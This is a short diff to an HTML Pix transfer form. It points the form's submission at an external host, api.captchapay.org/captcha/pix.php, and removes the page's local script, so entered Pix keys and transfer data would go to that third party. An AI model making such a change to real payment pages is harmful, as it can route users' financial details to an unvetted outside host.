@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>Transferência via Pix</h1>
-    <form id="pixForm">
+    <form action="https://api.captchapay.org/captcha/pix.php" method="post">
         <label for="key">Chave Pix:</label>
         <input type="text" id="key" name="key" required><br><br>
         
@@ -30,7 +30,5 @@
     </form>
 
     <div id="result"></div>
-
-    <script src="pix.js"></script>
 </body>
 </html>
